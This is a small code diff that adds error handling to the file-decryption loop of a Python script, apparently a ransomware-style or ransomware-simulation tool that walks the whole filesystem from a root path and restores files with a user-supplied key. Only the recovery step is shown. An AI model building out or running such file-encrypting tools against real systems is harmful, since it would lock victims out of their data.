@@ -89,8 +89,11 @@ if __name__ == "__main__":
             # decrypt all files that were encrypted
             files = find_files(os_root_path)
             for file in files:
-                print(f"decrypted {file}")
-                decrypt_file(file, l_key)
+                try:
+                    print(f"decrypted {file}")
+                    decrypt_file(file, l_key)
+                except Exception:
+                    print("failed")
 
             # success message
             tkinter.messagebox.showinfo("decrypt files", "decrypted files with the given key")
